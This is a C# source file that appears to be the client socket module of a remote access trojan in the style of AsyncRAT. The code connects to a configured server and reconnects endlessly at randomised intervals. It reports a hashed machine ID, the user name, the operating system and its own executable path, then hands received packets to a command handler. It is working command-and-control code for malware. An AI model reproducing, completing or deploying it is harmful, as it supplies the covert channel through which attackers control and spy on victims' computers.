using Client.MessagePack;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using Client.Handle_Packet;

namespace Client.Sockets
{

    class ClientSocket
    {

        public static Socket Client { get; set; }
        private static byte[] Buffer { get; set; }
        private static long Buffersize { get; set; }
        private static bool BufferRecevied { get; set; }
        private static Timer Tick { get; set; }
        private static MemoryStream MS { get; set; }
        private static object SendSync { get; set; }

        /// Initialization variables and connect to socket.
        public static void InitializeClient()
        {
            try
            {
                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                    ReceiveTimeout = -1,
                    SendTimeout = -1,
                };
                Client.Connect(Settings.IP, Settings.Port);
                Debug.WriteLine("Connected!");
                Buffer = new byte[1];
                Buffersize = 0;
                BufferRecevied = false;
                MS = new MemoryStream();
                SendSync = new object();
                BeginSend(SendInfo());
                TimerCallback T = CheckServer;
                Tick = new System.Threading.Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
                Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
            }
            catch
            {
                Debug.WriteLine("Disconnected!");
                Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
                Reconnect();
            }
        }

        /// Cleanup everything and start to connect again.
        public static void Reconnect()
        {
            if (Client.Connected) return;

            Tick?.Dispose();

            try
            {
                Client?.Close();
                Client?.Dispose();
            }
            catch { }

            MS?.Dispose();

            InitializeClient();
        }

        /// Method to send our ID to server's listview.
        private static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = HWID();
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString() + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
            return msgpack.Encode2Bytes();
        }

        private static string HWID()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(Environment.UserDomainName);
            sb.Append(Environment.UserName);
            sb.Append(Environment.MachineName);
            sb.Append(Environment.Version);
            return GetHash(sb.ToString());
        }

        private static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 12).ToUpper();
        }

        /// get the length of the buffer by reading byte by byte [1]
        /// until we get the full size.
        public static void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (Client.Connected == false)
                {
                    Reconnect();
                    return;
                }

                int Recevied = Client.EndReceive(ar);

                if (Recevied > 0)
                {

                    if (BufferRecevied == false)
                    {
                        if (Buffer[0] == 0)
                        {
                            Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
                            Debug.WriteLine("///  Buffersize: " + Buffersize.ToString() + "Bytes  ///");
                            MS.Dispose();
                            MS = new MemoryStream();
                            if (Buffersize > 0)
                            {
                                Buffer = new byte[Buffersize - 1];
                                BufferRecevied = true;
                            }
                        }
                        else
                        {
                            MS.Write(Buffer, 0, Buffer.Length);
                        }
                    }
                    else
                    {
                        MS.Write(Buffer, 0, Recevied);
                        if (MS.Length == Buffersize)
                        {
                            ThreadPool.QueueUserWorkItem(HandlePacket.Read, MS.ToArray());
                            MS.Dispose();
                            MS = new MemoryStream();
                            Buffer = new byte[1];
                            Buffersize = 0;
                            BufferRecevied = false;
                        }
                        else
                        {
                            Buffer = new byte[Buffersize - MS.Length];
                        }
                    }
                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    Reconnect();
                }
            }
            catch
            {
                Reconnect();
            }
        }

        /// Send
        /// adding the buffersize in the beginning of the stream
        public static void BeginSend(byte[] buffer)
        {
            lock (SendSync)
            {
                if (Client.Connected)
                {
                    try
                    {
                        using (MemoryStream MS = new MemoryStream())
                        {
                            byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
                            MS.Write(buffersize, 0, buffersize.Length);
                            MS.Write(buffer, 0, buffer.Length);

                            Client.Poll(-1, SelectMode.SelectWrite);
                            Client.BeginSend(MS.ToArray(), 0, (int)(MS.Length), SocketFlags.None, EndSend, null);
                        }
                    }
                    catch
                    {
                        Reconnect();
                    }
                }
            }
        }

        public static void EndSend(IAsyncResult ar)
        {
            try
            {
                Client.EndSend(ar);
            }
            catch
            {
                Reconnect();
            }
        }

        public static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
            ClientSocket.BeginSend(msgpack.Encode2Bytes());
        }
    }
}
